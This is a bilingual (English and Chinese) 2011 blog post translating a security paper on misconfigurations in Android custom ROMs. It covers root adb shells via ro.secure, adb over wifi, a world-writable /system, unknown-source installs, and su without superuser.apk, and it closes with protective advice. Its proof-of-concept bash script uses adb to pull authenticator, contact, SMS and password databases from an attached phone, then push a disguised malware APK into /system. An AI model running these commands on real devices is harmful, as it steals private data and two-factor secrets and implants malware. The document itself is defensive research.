---
layout: post
title: "[中英对照] Security Issues in Android Custom ROMs：定制ROM的安全问题"
date: 2011-10-19 06:25
comments: true
categories: tech mobile
---
![banner](/images/pics/JyV3F.png "banner")

<!--more-->

原文连接：[http://anantshri.info/articles/android_cust_rom_security.html](http://anantshri.info/articles/android_cust_rom_security.html)

#Abstract：摘要

This paper attempts to look behind the wheels of android and keeping special focus on custom rom’s and basically check for security misconfiguration’s which could yield to device compromise, which may result in malware infection or data theft.

本文试图着眼Android内部并特别关注第定制ROM，初步检查安全方面的错误配置，这些问题可能导致感染恶意软件、数据被盗，致使设备被黑。

#Introduction to Android：介绍

Android is a software stack for mobile devices such as mobile telephones and tablet computers developed by Google Inc and the Open Handset Alliance. Android consists of a mobile operating system based on the Linux kernel, with middleware, libraries and APIs written in C and application software running on an application framework which includes Java-compatible libraries based on Apache Harmony. Android uses the Dalvik virtual machine with just-in-time compilation to run compiled Java code. – WIKIPEDIA

Android是由Google Inc和Open Handset Alliance开发的一套用于移动电话和平台电脑的软件。包含一个基于Linux kernel的移动操作系统、中间件、用C写的库和API、一套包含基于Apache Harmony的Java兼容库的应用框架、以及运行其上的应用软件。Android使用具有JIT编译器的Dalvik虚拟机来运行已编译的Java代码。

In Simple terms Android is the operating system behind +40% smart phones and 10-20% tablet market. There are various manufacturers backing this OS including the likes of Samsung, Motorola, Sony Ericsson, LG, HTC and many more.

简而言之，Android占据了+40%的智能手机以及10-20%平板的操作系统市场。采用这个OS的厂商众多，例如Samsung、Motorola、Sony Ericsson、HTC等等。

Based on Linux kernel large part of the android source code is available in public space (except few google specific products and honeycomb or 3.X series ). This provides the unique opportunity for one and all to have a custom phone for him.

由于基于Linux kernel大部分Android的源代码可以公开获得（除了几个google产品、honeycomb或者3.X系列）。这个独特的机会使得大家都可以可以搞一个定制化的手机。

#What is Android ROM：ROM是什么

Android ROM is the basic OS firmware layer of the Phone. This is the base for phone operations. In file system generally this part is stored under /system. May have /data partition also in case it holds some user specific settings.

Android ROM是电话的基本OS固件。是电话操作的技术。从文件系统看，这部分存放在/system下面，可能还有/data分区用来保存一些特定的用户设置。

This is the portion which contains all quintessential parts of the os for proper functionality of the Phone.

下图包含了用来使电话正常运作的所有典型的组成部分。

Starting with linux kernel along with it modules to Dalvik VM, combined with core libraries and user liberaries (SQLite etc). This same portion also features the application framework which allows for seemless interaction of android applications with android core features, including the telephone.
On top of all this we see the applications running in Dalvik VM.

首先是linux kernel，之上是Dalvik虚拟机、以及核心库和用户库（SQLite等）。这同一部分同时是应用框架，用于应用和android核心功能的无缝交互，包括电话功能。再之上就是跑在Dalvik虚拟机上的应用程序了。

![image01](http://anantshri.info/articles/sec_cust/image002.jpg)


#Types of ROM：ROM的类型

Android ROM’s can be divided into two basic groups.

1. STOCK ROM: the ROM which comes preinstalled with Phone.
2. CUSTOM ROM: after market version which could be installed on a phone if the phone is rooted.

Android ROM主要两大类：

1. STOCK ROM：就是随电话预装的原厂ROM。
2. CUSTOM ROM：面市后可以安装在已root的手机上的定制ROM。

Stock ROMs generally contains vendor / carrier specific additions in them, where as Custom ROM’s have different motives behind them.

原厂ROM通常包含了厂商和运营商的定制组件，然而定制ROM在这方面的目的则不同。

Some of the most common and widely usable custom rom’s include

1. CyanogenMod: The largest aftermarket firmware compiled from android ASOP and strives to be as close to ASOP code as possible. Source code is publically open.
2. MIUI: a Chinese version focusing on emulation iPhone looks, source codes are not open.
3. OMFGB: a customized version of Gingerbread.

最常见和广泛应用的定制ROM包括：

1. CyanogenMod：最大的定制固件，编译于android ASOP开源项目并尽力和ASOP保持接近。源代码开放。
2. MIUI：一个致力于模仿iphone外观的中文版本，源代码不开放。
3. OMFGB：Gingerbread的一个定制版本。

Things to keep in mind are that in order to install a custom rom your phone needs to be rooted and / or boot loader unlocked. As well as a proper recovery should be installed.

需要牢记的的是想要在手机上安装一个定制ROM，必须先rooted或者把boot loader解锁。并安装一个正确的revovery程序。

#Advantages of custom ROM’s:定制的优势

Stock Rom’s or default OS kit that comes with the phone or carrier or phone manufacturing company is targeted towards a large set of audience and hence is made in a generic fashion. As well as in order to be unique in the market every manufacturer has added his own layer of UI on top of default android UI.

随手机厂商、运营商而来的原厂ROM是面对大多数用户的通用类型。同时为了在市场上显得不同，厂商往往在默认Android的UI基础上加入自己的UI层。

This is where custom ROM comes into picture:
Custom Rom comes with their own share of advantages.

1. Bring out the best of all Worlds. Some of the stuff those are actually available in wild.

	* You may like Sony Ericsson hardware but love the htc sense ui.

	* You don’t like the default applications and prefer a minimalistic phone.

	* ROMs with specific features / themes / customization as deemed good.

2. Provides update even when manufacturer / carrier stop’s update.
3. Bleeding edge (custom ROMs at this point are generally at 2.3.5 where as stock’s still holding to 2.3.3)
4. Custom ROMs are pre rooted.
5. Custom ROMs bring out the customization from CM and MIUI to the stock firmware.
6. Build for Speed.
7. Build for gaming.
8. Over clocking (increase performance), under clocking (increase battery life)

Effectively having a custom rom provides you the chance to customize the device to a lot higher level then generally possible.

这样就应运而生了定制ROM：因为定制ROM带来了他们的优点。

1. 博采众长。其中很多东西已经可以获得：

	* 比如你喜欢索爱的机器同时又想用HTC的sense界面。

	* 比如你不喜欢默认的app而喜欢一个最干净的电话。

	* 认为具备某些定制、主题、自定义的ROM才是好的。

2. 即使厂商、运营商已经停止更新的情况下仍能获得更新。

3. 玩尖端（目前定制ROM基本都是2.3.5而厂商ROM还是2.3.3）

4. 定制ROM都已经rooted

5. 定制ROM把个性定制从CM和MIUI带到厂商ROM

6. 为了速度

7. 为了游戏

8. 超频（提升性能）降频（提升电池寿命）

有效的拥有一个定制ROM使得你有机会把手机从通用状态带到更高的玩机程度。

#How to obtain custom ROM’s:怎么获得定制ROM

There are many ways and means to obtain these custom ROM’s. Some may include visiting the official site and some may include download the ROM’s from various file hosting site where the link is available at various forums. Couple of prominent links listed below.

有很多方式获得定制ROM。包括访问如下网站/论坛会提供各种下载ROM。

• [http://cyanogenmod.com](http://cyanogenmod.com)

• [http://miui.org](http://miui.org)

• [http://forum.xda-developers.com](http://forum.xda-developers.com)

• [http://android.modaco.com](http://android.modaco.com)

• [http://modmymobile.com/forum.php](http://modmymobile.com/forum.php)

• And many more underground forums.

还有很多其他地下论坛。

#How are they created:如何制作的？

Recipe of creating a rom is to follow one of the following practices.

1. Modify the stock ROM and add features to it.
2. Compile your own android from sources directly ASOP)
3. Modify Cyanogen or any other open source ROM.
4. Combine both and work on a custom rom taking parts from stock and ASOP.

制作ROM的配方如下：

1. 修改原厂ROM加入新特性
2. 直接从ASOP开源项目编译自己的ROM
3. 修改Cyanogen或者其他开源ROM
4. 从原厂ROM和ASOP混合定制一个ROM

The people behind ROM cooking are doing this for variety of reasons. Some for fun, others for profit and some just do it coz they can do it.

做ROM的人有各种理由。为了好玩、为了利益以及只是因为有能力做ROM。

#Why do we need a security review：为啥要做一个安全审查

Android with its huge market share has made ways into the pockets of the corporate giants, and slowly-slowly voices are being raised to incorporate android in corporate infrastructure. With growing sales this demand is only going to increase and in no ways going to diminish. Keeping this in mind lots and lots of research work is going on to find suitable ways and means to incorporate custom ROM’s into corporate infrastructure. One such work is documented here : [https://www.sans.org/reading_room/whitepapers/sysadmin/securely-deploying-android-devices_33799](https://www.sans.org/reading_room/whitepapers/sysadmin/securely-deploying-android-devices_33799). Also with rapid growth in market share we have seen unprecedented growth in worm virus and malware growth in android too.

Keeping all these factors in mind we do seriously need to investigate more on the android custom ROM’s.

由于Android的巨大市场份额使之进入了大企业的“口袋”中，逐渐的有提出把Android整合进企业基础设施。随着销售增长这个需求只会增不会减。大量的研究正在进行以找到合适的方法在企业基础设施整合定制ROM。例如 [https://www.sans.org/reading_room/whitepapers/sysadmin/securely-deploying-android-devices_33799](https://www.sans.org/reading_room/whitepapers/sysadmin/securely-deploying-android-devices_33799)。同时随着市场的快速增长，我们看到Android上蠕虫、病毒和恶意软件的空前增加。

基于上述因素我们需要认真研究android的定制ROM。

#Practices under Scrutiny：详细检查后后动手

This paper is an effort in directions of looking at security misconfigurations that can happen. Some of the stuff is already present in current ROM; others might be hypothetical but seriously exploitable. We are focusing basically on the core layer of android, I will be detailing about various settings and configurations which might result in a total security breach of android device.

本文试图关注那些可能发生的安全错误配置。其中一部分已经在当前ROM中存在；其他可能属于假设但也是严重的漏洞。我们基本上关注anddroid的核心层，会详述各种可能导致安全危害的设置和配置。

##USB Debugging enabled：开启USB调试

USB debugging or ADB is Google’s method for debugging support this is the setting which needs to be enabled when you are doing development or debugging of application, however there is no need to keep this setting enabled when its a normal user system.ADB Bridge supports push and pull of files and folders from all the directories where adb user have access.

USB调试/ADB是google提供的debug工具以便在开发和调试应用时开启，但是没有必要在一个普通用户的系统上打开。ADB Bridge支持所有具有adb用户权限的文件和文件夹的推拉。

Adb has various options which allows many more features including

- Logcat collection
- Installation of software
- Remount of system partition with rw

Adb also allows for fastboot which in turn allows a user to run non verified or unofficial kernel without even overwriting the stock data.

ADB有大量选项允许如下更多特性：

- 日志收集
- 软件安装
- 以RW读写权限重新加载文件系统

ADB也允许fastboot操作，允许在不改写原厂数据的情况下运行未经验证非官方kernel。

This setting is available in android machine in following place

该设置在android机器的如下位置：

	Menu → Settings → Applications → Development

![image02](http://anantshri.info/articles/sec_cust/image004.jpg)

This options should be kept enabled only when you are a constant developer or you keep your handset connected to pc all the time. However this must be turned off before connecting to any non trusted machine.

这个选项只有当你是一个长期的开发人员或者始终将手机和pc连接时才应该打开。但当连接到任何非信任机器时都应该关闭。

##Adb Shell root mode：Adb Shell root模式

This is one of the most dangerous setting of all. This setting allows adb shell to connect in root user mode. Effectively giving a root shell to whosoever gets usb connection to phone. Another tricky point about this setting is its activated only at boot time and during whole period of working the variable can’t be changed.

这是最危险的设置之一。允许adb shell连接到root用户模式。只要有USB连接到电话就可以得到一个root的shell。更要命的是这哥设置仅在启动时激活而在工作过程中无法改变。

Also we need to keep this in mind that when this feature is enabled that means you don’t even need su binary to gain root access. You just need usb debugging to be enabled.

需要了解这个设置打开意味着你不需要su就可以得到root权限。只要usb调试设置打开。

Build.prop inside the ramdisk generally contains this value. In order to check or modify the ramdisk you need to use following procedure.

通常在ramdisk的Build.prop包含这个值。以下方式可以检查或修改：

	Location of build.prop : boot.img → ramdisk.cpio.gz → gunzip → un cpio → build.prop
	Variable name : ro.secure
	Default value in STOCK ROM’s : 1
	Default value in cyanogen and others : 0

If we look at this along with what was discussed in adb shell mode. We have a ready made root user shell which will give me full access to all files, flexibility to push and pull both from just about any level. In not so good hands this simple setting can cause a phone to lose all its important work.

联系我们在adb shell模式的讨论，我们得到了一个现成的root用户shell可以完全控制所有文件。可能导致手机丢失所有的重要数据。

![image03](http://anantshri.info/articles/sec_cust/image0061.jpg)

##Adb shell over wifi：基于wifi的Adb shell

Another variable which could be set to allow adb shell access. However this time access is over wifi network.

有一个可以打开adb shell的设置。只不过这次是通过wifi网络。

	Variable : service.adb.tcp.port = <tcp_port_no>

To set this variable you can either place it in build.prop or use commandline

可以通过build.prop设置或者使用命令行进行

	#setprop service.adb.tcp.port=3355

This will mark port 3355 on phone to be usable to attach using adb. However in this case you need to restart adb service once.

这个将3355端口设为用来adb连接。在这个例子里，需要重启adb服务。

Combining this with above two settings and you have handed over your cell phone to one and all, while shouting in top of your voice : – PLEASE OWN ME.

结合上述两个设置，你几乎已经将你的手机拱手让人。

Note : this is a hypothetical attack as this is not yet a common habbit.

注：这是假设的攻击情况，因为这不是一个通常的习惯设置。

##System permissions：系统权限

In Android Devices, system partition is the most important partition which holds all the system critical files, as per general policy this partition is marked as RO i.e. readonly. However a general aftr market practice which is observed is to mark system partition as rw. The general use case is that by putting system in rw mode it is easy to work on modification of system data. The most harmful setting is if your ROM maker marks system with 777 i.e. rwx or read write execute permission for all users.

在android设备中，system分区是最重要的，包含了所有重要的系统文件，基于常规这个分区是只读的。然后定制过程常常把它设为可读写以便操作和修改系统数据。最恐怖的是做ROM的人把system设置为777即允许所有人读、写、执行。

![image04](http://anantshri.info/articles/sec_cust/image006.jpg)

When a system is marked with write permission it will allow a user to update / modify content of /system partition. Some of the crucial folders include /system/app or /system/bin.

This permission is an open invitation to rootkits, malware, viruses and all simmilar items to start manhandling the device.

Example in below scenario if some app gains root access they can modify any file in /system. However another variation is 777 for /system which effectively allows the whole world to modify the content.

当system被设有写权限将允许更新修改/system分区，包括关键的/system/app或/system/bin。

这个权限直接导致roorkit、恶意软件、病毒等类似东东恶意控制设备。

图例中，如果应用获得root权限他们可以修改/system下任何文件。而/system设置成777意味着所有人可以修改内容。

##Installation from unknown source：来自未知源的安装

This specific setting is a security issue in itself. This check allows a user to install softwares which are not part of android market.

Note : for users who don’t have access to android market this is the only way to install application. Example large number of chinese android installation doesn’t allow android market.

这个设置本身就是个安全问题。选中后允许用户安装非官方市场的软件。

注：对没有访问官方市场权限的用户来说，这是安装应用的唯一方法。比如大量的中国android安装不允许官方市场。

This setting is available in android machine in following place
这个设置在如下位置：

	Menu → Settings → Applications

![image05](http://anantshri.info/articles/sec_cust/image008.jpg)

General Practice in after market forums is to keep this check enabled allowing users to install and experiment with after market applications. In other places people are instructed to check this box to allow automated tools to install applications however they wont tell users to unckeck after automatic task is done.

讨论定制的论坛常要求打开这个选项以便安装和体验各类引用。另一些情况，用户被要求打开这个设置以便自动安装应用，但是他们不会告诉用户安装后关闭这个选项。

##Su acccess and settings：Su访问和设置

Rooting of android phone is generally associated with installing su binary. This binary allows a user for shifting the user to root. This is accoumpanied with superuser.apk which acts as a control agent.

android的root通常伴随su工具的安装。这个工具允许普通用户转变称root。这其中也伴随安装superuser.apk来作为控制代理。

However there can be multiple scenarios’s which need to be throughly examined.

1. Su binary installed and superuser.apk installed
2. Su binary installed but superuser.apk missing.
3. Su missing but superuser.apk installed
4. Su and superuser.apk both missing.

Case 1 denotes max protection possible.

Case 2 is a critical case as superuser.apk is the governing control over su binary and if its not there then su could be called directly without fear of user pormpt.

多种情况需要检查：

1. su工具安装，superuser.apk也安装
2. su工具安装，superuser.apk未安装
3. su工具未安装，superuser.apk安装
4. su和 superuser.apk均未安装

第一种情况提供了最大保护。

第二种情况最要名，因为superuser.apk是su的管理控制，如果不存在的话su就可以被直接随意调用了。

![image06](http://anantshri.info/articles/sec_cust/image010.jpg)

##Custom Recoveries：定制恢复

All Custom ROMs are generally embedded with one or the other form of custom recovery. These recovery softwares provides you with large amount of options including but not limited to

- Factory Reset
- Partitioning
- Backup and Restore
- Install / modify parts of internal storage (/system /data etc)
- Adb shell in root mode

所有定制ROM都集成了某个定制的recovery工具。这个recovery软件提供大量选项包含但不限于：

- 恢复出厂设置
- 分区
- 备份恢复
- 安装修改内部存储（/system /data 等）
- root模式的adb shell

Below we have screenshots of two different kind of recoveries.

如下，是两个不同的recovery程序的截屏。

![image07](http://anantshri.info/articles/sec_cust/image012.jpg)
![image08](http://anantshri.info/articles/sec_cust/image014.jpg)
            
The highlighted portions are the risk’s associated with custom Recoveries. And could potentially lead to device compromise.

高亮部分是recovery程序风险较大的，可能导致设备挂掉。

Another risk associated with the recoveries is that none of the recoveries at this point implement any security feature. There is no password protection or internal check. Launching recovery is as simple as reboot device and repeatedly press back button or vol down key.

另一个风险是recovery程序目前都没有安全特性。比如没有密码保护或者内部检查。调用恢复程序简单到只需要在重启手机时同时按back键或者减小音量键。

Note : considering the experimental nature of custom recoveries password protection could be a lesser priority feature as of now.

注：考虑在recovery程序中加入密码保护等在目前是一个很低优先级的需求。

#PoC Code：PoC代码

Note : The PoC code is not developed into something fully deployable to avoid script kiddy approach.

	#!/bin/bash
	#this command will wait till a device is attached
	adb wait-for-device
	#this command will give you the id of the shell user. If 0 then w00t
	id=`adb shell id`
	#system permissions rwx
	sys_perm=`adb shell ls -l -d /system`
	echo id
	echo sys_perm
	#in case system ro then this will remount to rw
	adb remount
	#app protector password
	adb pull /data/data/com.ruimaninfo.approtect/shared_prefs/	com.ruimaninfo.approtect_preferences.xml
	#google authenticator.
	adb pull /data/data/com.android.apps.authenticator/databases/databases.db
	adb pull /data/data/com.andrid.providers.settings/databases/settings.db
	adb pull /data/data/com.providers.contacts/databases/contacts2.db
	adb pull /data/data/com.providers.telephony/databases/mmssms.db
	adb pull /data/data/com.providers.telephony/databases/telephony.db
	adb pull /data/data/com.google.android.apps.plus/databases/

	# or you can go directly in attack mode.
	# inject payload
	adb push malware.apk /system/apps/friendly.apk

	# create backup
	adb pull /data/data


#Protection：保护

##General User：普通用户

With rooting comes great responsibility, you can’t just roam around and do stuff without giving a heed to the underlying danger. From vary basic stuff a user must keep in mind atleast these basic fundamental security points.

- USB debugging should be enabled only when its required.
- Consider your Phone as your Credit Card and protect it in same manner.
- Avoid handing over your phone to unknown or not so trusty person’s.

root意味着巨大的责任，你不能只是用的爽快而不去关心潜在的风险。最起码一个用户必须了解基本的安全要点：

- USB调试只在需要时才被打开
- 把电话当作信用卡一样保护
- 避免把电话交给不认识或者不信任的人

##Rom Developer：ROM开发者

Rom Developers need to make sure the setting which require developer intervention are kept in check specially stuff related to ro.secure, /system, superuser.apk and apps installed in /system/app need to be checked by dev’s.

ROM开发者要确保那些需要开发者关注的设置都正确，特别是和ro.secure、/system、superuser.apk以及安装在/system/app的应用等相关的部分。

Developers should encourage dual profile usage one which could be used to testing ROM’s and development work where as other profile which should be the stable one. With most of these settings marked as off.

开发者尽量采用双版本策略，一个用来测试开发，另一个作为稳定版本，其中大部分非安全设置都已经关闭。

#Introduction to Are you Insecure App：介绍Are you Insecure应用

A simple PoC tool created to show how simple settings could cause dangerous actions. This tool is basically checking 5 of the above described issues and giving out details which are not at secure level and what could be done to secure it.

有个简单的工具可以显示简单的设置可能导致危险动作。这个工具基本上是检查上述5点问题，给出不安全的具体描述以及如何调整设置。

The tool at this point is very crude and would be refined with subsequent updates.

目前这个工具比较原始并将会在未来更新中完善。

![image09](http://anantshri.info/articles/sec_cust/image016.jpg)

Some of the shortcomings at this point :

- SU and superuser.apk access check is not the best in world.
- Can’t check for recovery installed.

目前的一些短板：

- SU和superuser.apk访问检查并不完美
- 不能检查是否安装了recovery程序

#References：参考

[http://android.com](http://android.com)

[http://cyanogenmod.com](http://cyanogenmod.com)


